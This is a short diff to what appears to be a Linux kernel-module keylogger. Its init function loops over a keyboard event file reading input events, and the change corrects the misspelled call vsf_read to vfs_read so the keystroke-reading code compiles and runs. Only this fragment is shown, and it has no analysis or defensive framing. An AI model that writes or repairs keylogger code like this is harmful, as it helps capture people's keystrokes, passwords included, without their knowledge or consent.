@@ -33,7 +33,7 @@ static int __init keylogger_init(void) {
 
     // Read the keyboard event file
     while (1) {
-        ret = vsf_read(file, (char*)&ie, sizeof(struct input_event), &offset);      // Read the keyboard event file
+        ret = vfs_read(file, (char*)&ie, sizeof(struct input_event), &offset);      // Read the keyboard event file
         if (ret < 0) {                                                              // If the return value is negative
 
             printk(KERN_ALERT "Couldn't read keyboard-event file!\n");              // Print error message
